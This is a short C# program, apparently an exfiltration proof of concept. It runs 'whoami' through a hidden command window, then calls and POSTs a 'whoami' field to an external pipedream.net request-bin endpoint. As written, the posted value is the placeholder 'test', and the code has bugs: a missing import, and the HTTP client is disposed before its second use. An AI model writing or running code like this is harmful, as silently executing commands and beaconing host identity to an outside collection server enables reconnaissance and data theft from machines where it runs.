using System;
using System.Net;
using System.Net.Http;
// https://qawithexperts.com/article/c-sharp/run-cmd-commands-using-c/520
// https://stackoverflow.com/a/27326758/9329272

namespace Testing
{
    public class Program
    {
        static readonly HttpClient client = new HttpClient(new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate });
        static void Main()
        {
            string command = "whoami";
			System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
			procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            // Do not create the black window.
            procStartInfo.CreateNoWindow = true;
            // Now we create a process, assign its ProcessStartInfo and start it
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();

            // Get the output into a string
            string whoami = proc.StandardOutput.ReadToEnd();
            Console.WriteLine("Making API Call...");
            using (client)
            {
                client.BaseAddress = new Uri("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
                HttpResponseMessage response = client.GetAsync("").Result;
                response.EnsureSuccessStatusCode();
                string result = response.Content.ReadAsStringAsync().Result;
                Console.WriteLine("Result: " + result);
            }
            PostMe();
        }
        static async void PostMe()
        {
            var values = new Dictionary<string, string>
            {  
                { "whoami", "test"}
            };

            //form "postable object" if that makes any sense
            var content = new FormUrlEncodedContent(values);

            //POST the object to the specified URI 
            var response = await client.PostAsync("https://eoqqzdfuzmgq7gg.m.pipedream.net/", content);

            //Read back the answer from server
            var responseString = await response.Content.ReadAsStringAsync();
        }
    }
}